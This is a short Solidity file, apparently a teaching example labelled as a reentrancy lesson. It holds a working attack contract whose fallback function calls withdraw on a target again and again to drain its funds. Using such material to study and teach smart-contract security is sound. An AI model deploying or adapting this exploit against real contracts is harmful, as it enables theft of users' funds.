/// @knowledgePoint 重入

/// @level 普通

pragma solidity ^0.4.19;
import"./Withdraw.sol";

contract ReentranceAttack{
    Reentrance re;
    function ReentranceAttack(address _target) public payable{
        re = Reentrance(_target);
    }

    function wallet() view public returns(uint256){
        return address(this).balance;
    }

    function deposit() public payable {
        re.deposit.value(msg.value)();
    }

    function attack() public {
        re.withdraw(1000000000000000 wei);
    }

    function () public payable {
        if (address(re).balance >= 1000000000000000 wei){
            re.withdraw(1000000000000000 wei);
        }
    }

}